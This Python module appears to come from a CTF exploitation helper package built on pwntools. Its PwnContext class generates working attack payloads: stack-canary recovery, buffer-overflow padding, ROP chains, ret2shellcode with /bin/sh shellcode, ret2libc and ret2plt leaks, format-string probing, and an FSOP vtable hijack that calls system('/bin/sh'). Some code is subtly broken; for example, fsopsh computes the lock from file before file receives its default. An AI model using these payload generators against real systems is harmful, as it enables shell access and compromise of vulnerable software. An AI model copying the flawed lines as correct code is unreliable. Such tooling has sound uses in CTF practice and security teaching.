import math
import re

from pwn import ROP, asm, context, cyclic, cyclic_find, log, shellcraft, flat
import pwn

from pwninit.helpers.utils import u64, upack
from pwninit.helpers.constants import *

class PwnContext:
    """A context class for managing pwn tools state, including IO, ELF, libc,
    and exploitation helpers.

    Attributes:
        io (IOContext): The IO context for interacting with the target.
        elf (ELF): The ELF binary being exploited.
        libc (ELF): The libc library being used.
        prefix (str): Prefix for sending/receiving data.
        _offset (int): Cached offset for buffer overflows.
        _canary (int): Cached canary value.
    """

    def __init__(self, io, elf, libc, prefix=None):
        self.io = io
        self.elf = elf
        self.libc = libc
        self.prefix = prefix
        self._offset = None
        self._canary = None

    @property
    def canary(self):
        """Get the canary value for the current process.

        Returns:
            int: The canary value, or None if not found.
        """
        if not self._canary and self.io and self.io.proc and self.elf.canary:
            canary = 0x0
            auxv = open(f"/proc/{self.io.proc.pid}/auxv", "rb").read()
            word = context.bytes
            for i in range(0, len(auxv), 2 * word):
                a_type = u64(auxv[i : i + word].ljust(8, b"\x00"))
                a_val = u64(auxv[i + word : i + 2 * word].ljust(8, b"\x00"))
                if a_type == 25:  # AT_RANDOM
                    canary = u64(
                        (b"\x00" + self.io.proc.readmem(a_val + 1, 7)).ljust(
                            8, b"\x00"
                        )
                    )
                    break
            self._canary = canary
        return self._canary

    @canary.setter
    def canary(self, new_canary):
        self._canary = new_canary

    @property
    def offset(self):
        """Get the offset for buffer overflows by sending a cyclic pattern and
        analyzing the corefile.

        Returns:
            int: The offset value.
        """
        if not self._offset:
            context.delete_corefiles = True
            if hasattr(self.io, "sendline"):
                self.io.sendline(cyclic(1000))
            self.io.poll(block=True)
            core = self.io.corefile
            self._offset = cyclic_find(core.fault_addr)
            log.info(f"offset: {self._offset}")
        return self._offset

    @offset.setter
    def offset(self, new_offset):
        """
        Get the offset for buffer overflows by sending a cyclic pattern and analyzing the corefile.

        Returns:
            int: The offset value.
        """
        self._offset = new_offset

    def __find_sym(self, symbol, bin_obj):
        if isinstance(symbol, int):
            return symbol
        elif "+" in symbol:
            func, off = symbol.split("+")
            return bin_obj.sym[func] + int(off, 0)
        elif "-" in symbol:
            func, off = symbol.split("-")
            return bin_obj.sym[func] - int(off, 0)
        else:
            return bin_obj.sym[symbol]

    def resolve(self, symbol):
        """
        Resolve a symbol to an address in either the ELF or libc.

        Args:
            symbol (str or int): The symbol name or address.

        Returns:
            int: The resolved address, or None if not found.
        """
        if isinstance(symbol, int):
            return symbol

        for b in (self.libc, self.elf):
            try:
                addr = self.__find_sym(symbol, b)
                if addr is not None:
                    return addr
            except Exception:
                continue
        return None

    def leak(self, leak_data, leaked=0, name=""):
        """
        Parse and log a memory leak, optionally assigning it to a context variable.

        Args:
            leak (bytes or str): The leaked data.
            leaked (int): Value to subtract from the leak.
            name (str): Name of the variable to assign the leak to (e.g., "libc", "elf").

        Returns:
            int: The parsed leak value.

        Example:

            >>> stack = leak(b'[LEAK] The address of cmd where you are writing to is: 0x7ffeab2e0b90')
            [*] [stack]: leak = 0x7ffc710958d0

            >> print(hex(stack))
            0x7ffc710958d0
        """
        start = leak_data.find(b"0x")
        base = 0

        if start >= 0:
            leak_data = leak_data[start:]
            end = 2
            for i in leak_data[2:]:
                try:
                    int(chr(i), 16)
                    end += 1
                except ValueError:
                    break
            leak_val = int(leak_data[:end], 16)
        else:
            if len(leak_data) <= 8:
                leak_val = upack(leak_data)
            else:
                if leak_data[-1] == 0xA:
                    leak_data = leak_data[:-1]

                for i in range(len(leak_data)):
                    for j in range(6, 8):
                        l_val = upack(leak_data[i : i + j])
                        found_name, found_base = self.check_leaks(l_val)
                        if found_name:
                            log.info(
                                f"{found_name} found at leak[{i}:{i + j}]"
                            )
                            break
                else:
                    log.warn("cannot find leak, try another way")
                    exit(0)
                return

        leak_val -= leaked

        if not name:
            name, base = self.check_leaks(leak_val)

        if base == 0:
            base = leak_val

        var = getattr(self, name, False)
        if var:
            if type(getattr(var, "address", False)) is int:
                var.address = base
            else:
                setattr(self, name, base)

        if base > 0 and leak_val != base:
            log.info(
                f"{name}: leak = {leak_val:#x}, base = {base:#x}, diff = {leak_val - base}"
            )
        elif name:
            log.info(f"{name}: leak = {leak_val:#x}")
        elif not self.io:
            log.info(f"leak = {leak_val:#x}")
        else:
            log.warn("no leak found")

        return leak_val

    def check_leaks(self, leak_val):
        """
        Check if a leaked value corresponds to a known memory region (e.g., libc, elf, canary).

        Args:
            leak (int): The leaked value.

        Returns:
            tuple: (name, base) where `name` is the region name and `base` is the base address.
        """
        base = 0
        name = ""

        if not self.io or not self.io.proc:
            return name, base

        if self.canary and hex(leak_val) in hex(self.canary):
            return "canary", self.canary

        for m in self.io.proc.maps():
            if m.start <= leak_val <= m.end:
                if self.elf and self.elf.path == m.path:
                    name = "elf"
                    base = self.io.proc.elf_mapping().address
                elif self.libc and self.libc.path == m.path:
                    name = "libc"
                    base = self.io.proc.libc_mapping().address
                else:
                    name = m.path.strip("/")
                    if hasattr(self.io.proc, f"{name}_mapping"):
                        base = getattr(
                            self.io.proc, f"{name}_mapping"
                        )().address
                return name, base

        return name, base

    def ropchain(self, chain, ret=True):
        """
        Generate a ROP chain for the specified chain of function calls.

        Args:
            chain (dict): A dictionary mapping function names to their arguments.
            ret (bool): If True, add a `ret` gadget at the start and end of the chain.

        Returns:
            bytes: The generated ROP chain.

        Example:

            >>> payload = ropchain({"shell": []}})
            [*] ROP :
                0x0000:        0x804835a ret
                0x0004:        0x8048516 shell()
                0x0008:        0x804835a ret
            >>> payload
            b'Z\\x83\\x04\\x08\\x16\\x85\\x04\\x08Z\\x83\\x04\\x08'
        """
        elfs = []
        if self.elf and (not self.elf.pie or self.elf.address):
            elfs.append(self.elf)
        if self.libc and (not self.libc.aslr or self.libc.address):
            elfs.append(self.libc)

        rop = ROP(elfs)
        if elfs and ret:
            rop.raw(rop.ret.address)

        for func, params in chain.items():
            if isinstance(func, str) and "+" in func:
                f, off = func.split("+")
                func = self.resolve(f) + int(off)
            if not isinstance(params, dict):
                rop.call(func, params)
            else:
                for value, gadget in rop.setRegisters(params):
                    from pwnlib.rop.gadgets import Gadget

                    if isinstance(gadget, Gadget):
                        rop.raw(gadget)
                    else:
                        rop.raw(value)
                rop.call(func)

        rop.raw(rop.ret.address)
        log.info(f"ROP :\n{rop.dump()}")
        return rop.chain()

    def bof(self, data, opt=None, bp=None, **kwargs):
        """
        Generate a buffer overflow payload with optional canary and base pointer.
        Canary and offset are set using ctx.offset and ctx.canary

        Args:
            data: The data to include in the payload.
            opt (dict): Optional overrides for specific offsets.
            bp: Base pointer value to include.
            **kwargs: Additional arguments for `flat`.

        Returns:
            bytes: The generated payload.

        Example:

            >>> ctx.offset = 128
            >>> bof(b'TEST')
            b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabTEST'
        """
        offset_val = self.offset
        canary_val = self.canary

        if opt is None:
            opt = {}

        if canary_val:
            opt |= {offset_val-context.bytes*2: canary_val}

        if bp:
            opt |= {offset_val-context.bytes: bp}

        return flat({offset_val: data} | opt, **kwargs)

    def ret2shellcode(self, addr: int|str, **kwargs):
        """
        Generate a payload to return to shellcode at the specified address.

        Args:
            addr (int): The address of the shellcode.
            **kwargs: Additional arguments for `bof`.

        Returns:
            bytes: The generated payload.

        Example:

            >>> ctx.offset = 128
            >>> payload = ret2shellcode(0x0)
            [*] Loaded 12 cached gadgets for './ch15'
            [*] ROP :
                0x0000:        0x804835a ret
                0x0004:             0x25 0x25()
                0x0008:        0x804835a ret
            >>> payload
            b'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x81\\xec\\x00\\x10\\x00\\x00jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80gaabZ\\x83\\x04\\x08%\\x00\\x00\\x00Z\\x83\\x04\\x08'
        """
        addr = self.resolve(addr)
        shellcode = asm(shellcraft.sh())
        stub = (
            asm("sub esp, 0x1000")
            if context.bits == 32
            else asm("sub rsp, 0x1000")
        )
        shellcode = stub + shellcode
        padding_len = (
            self.offset
            - context.bytes * (self.elf.canary + 1)
            - len(shellcode)
        )
        padding = asm("nop") * padding_len
        addr += len(padding) // 2
        payload = self.ropchain({addr: []})
        return self.bof(payload, opt={0: [padding, shellcode]}, **kwargs)

    def ret2win(self, win, params=None, **kwargs):
        """
        Generate a payload to call a `win` function with the specified parameters.

        Args:
            win (str or int): The `win` function name or address.
            params (list): Arguments to pass to the `win` function.
            **kwargs: Additional arguments for `bof`.

        Returns:
            bytes: The generated payload.
        """
        if params is None:
            params = []
        addr = self.resolve(win)
        payload = self.ropchain({addr: params}, **kwargs)
        return self.bof(payload, **kwargs)

    def ret2libc(self, **kwargs):
        """
        Generate a payload to call `system("/bin/sh")` using libc.

        Returns:
            bytes: The generated payload.
        """
        system = self.libc.sym["system"]
        bin_sh = next(self.libc.search(b"/bin/sh\x00"))
        payload = self.ropchain({system: [bin_sh]})
        return self.bof(payload, **kwargs)

    def ret2plt(self, func="puts", ret2main="main", **kwargs):
        """
        Generate a payload to leak a libc address using the PLT.

        Args:
            func (str): The function to leak (default: "puts").
            ret2main (str): The function to return to after leaking (default: "main").
            **kwargs: Additional arguments for `bof`.
        """
        func_plt = self.elf.plt[func]
        func_got = self.elf.got[func]
        if ret2main:
            main_addr = self.resolve(ret2main)
            payload = self.ropchain({func_plt: [func_got], main_addr: []})
        else:
            payload = self.ropchain({func_plt: [func_got]})
        self.bof(payload, **kwargs)
        leak_val = upack(self.io.recv())
        self.libc.address = leak_val - self.libc.sym[func]

    def format_string(self, n=100):
        """
        Exploit a format string vulnerability to leak memory.

        Args:
            n (int): Number of `%p` placeholders to include in the payload.

        Returns:
            int: The index of the payload in the output.
        """
        payload = "A" * context.bytes + ".%p" * n
        self.io.send(payload)
        output = self.io.recv().split(b".")
        log.info(f"format string : {output}")
        ascii_hex_target = "0x" + "41" * context.bytes
        return output.index(ascii_hex_target.encode())

    def fsopsh(
        self,
        func=None,
        arg=b"/bin/sh\0",
        file=None,
        trigger=XSPUTN,
        lock=None,
        chain=None,
    ):
        """
        Generate a fsop payload to call a function (usually system("/bin/sh"))

        Arguments:
            func(int): Address of the function to be called, libc's system by default
            arg(bytes): First argument of the call, /bin/sh by default
            file(int): Address of the file structure, libc's stdout by default
            trigger(int): Vtable entry to trigger call on, XSPUTN by default
            lock(int): Value to put as lock (an empty zone), file+0x800 by default

        Example:

            >>> fsopsh()
            b'\\x01\\x01\\x01\\x01\\x01\\x01\\x01;/bin/sh\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\xfb\\xd1\\r\\xadU\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\xf3\\xd1\\r\\xadU\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x90\\xb2d\\xf9\\x08\\x7f\\x00\\x00@\\x1f~\\xf9\\x08\\x7f\\x00\\x00x\\xf3\\xd1\\r\\xadU\\x00\\x00'
        """

        func = func or self.libc.sym.system
        lock = lock or file + 0x800
        file = file or self.libc.sym._IO_2_1_stdout_

        return flat(
            {
                0x00: [0x3B01010101010101, arg],
                0x68: chain if chain else 0x0,
                0x78: -1,
                0x88: lock,  # empty zone as lock
                0x90: -1,
                0xA0: file,  # wide_data
                0xD0: func,
                0xD8: self.libc.sym["_IO_wfile_jumps"]
                - (trigger - OVERFLOW),  # vtable
                0xE0: file + (0xD0 - 0x68),  # wide_data->vtable,
            },
            filler=b"\0",
        )

    def binsh(self):
        """
        Find the address of `/bin/sh` in libc.

        Returns:
            int: The address of `/bin/sh`.
        """
        return next(self.libc.search(b"/bin/sh\0"))


pwnctx = None

def set_ctx(new_ctx: PwnContext):
    global pwnctx
    pwnctx = new_ctx

def _require_ctx():
    if pwnctx is None:
        raise RuntimeError("PwnContext not initialized — call set_ctx() first")


def _ctx(name):
    def wrapper(*args, **kwargs):
        _require_ctx()
        return getattr(pwnctx, name)(*args, **kwargs)

    wrapper.__name__ = name
    return wrapper


def _ctx_prop(name):
    def wrapper():
        _require_ctx()
        return getattr(pwnctx, name)

    wrapper.__name__ = name
    return wrapper


leak = _ctx("leak")
resolve = _ctx("resolve")
check_leaks = _ctx("check_leaks")
ropchain = _ctx("ropchain")
bof = _ctx("bof")
ret2shellcode = _ctx("ret2shellcode")
ret2win = _ctx("ret2win")
ret2libc = _ctx("ret2libc")
ret2plt = _ctx("ret2plt")
format_string = _ctx("format_string")
fsopsh = _ctx("fsopsh")
binsh = _ctx("binsh")

offset = _ctx_prop("offset")
canary = _ctx_prop("canary")
